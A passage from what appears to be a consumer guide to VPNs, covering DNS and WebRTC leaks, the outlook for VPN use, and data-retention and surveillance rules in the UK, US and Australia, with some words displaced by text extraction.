process  it.  It  can  unveil  your  location, internet  service  provider  IP  address,  and  your  browsing history.        WebRTC leaks – This issue normally arises with Brave, Chrome, Firefox, or any chromium-based browser that uses WebRTC APIs. This kind of leak exposes your IP address via  the  browser.  Regrettably,  it  doesn’t  matter  if  you  are utilizing a reliable or good VPN. However, you can fix these issues in your browser.  To  avoid  any  leak  to  your  IP  address,  browsing  the  history, location, or information, it is important to regularly test your VPN to check for any leaks, problems, or vulnerabilities that may affect you in the latter run.  The Future of VPNs In  all  fairness,  I  have  touched  on  every  possible  angle  to  your internet  privacy  and  security  in  regards  to  VPN.  The  prospect  for VPNs  looks  bright,  even  if  many  don’t  consider  it  for  the  right reasons.  Online  censorship,  corporate  tracking,  and  mass surveillance will continue to be a driving force for high usage of VPN. We  have  seen  that  internet  service  providers  are  increasingly blocking  access  to  various  websites  ranging  from  torrent  to  adult content websites.  Furthermore,  concerns  over  users’  privacy  and  surveillance  are  increasing swiftly. For instance, in countries like:      to   record   The  United  Kingdom  is  regarded  as  the  worst  country for your privacy. Telephone companies and internet service providers  are  necessitated  by-laws  text messages,  all  browsing  history,  and  locations  of  their customers. These data are offered to the United Kingdom government agencies without any warrant available  In the United States, service providers can legally record browsing  details,  text  messages,  and  sell  information  to advertisers.  Furthermore,  they  are  obligated  to  provide relevant  information  to  surveillance  agencies  as  the  need arises.  In  Australia,  which  has  a  similar  challenge,   the government has implemented a compulsory data retention scheme, which requires telecom operators to collect calls, text messages and internet connection data.  Clearly,  performing  various  online  activities  without  using  a reliable  VPN  will  expose  you  to  various  dangers  in  the  world. Therefore,  to  safeguard  your  data  and  hinder  cybercriminals  from invading into your privacy, it is unnegotiable for you to install a VPN service on your device or computer system. Your online privacy and security is a priority if you want to safeguard your data.
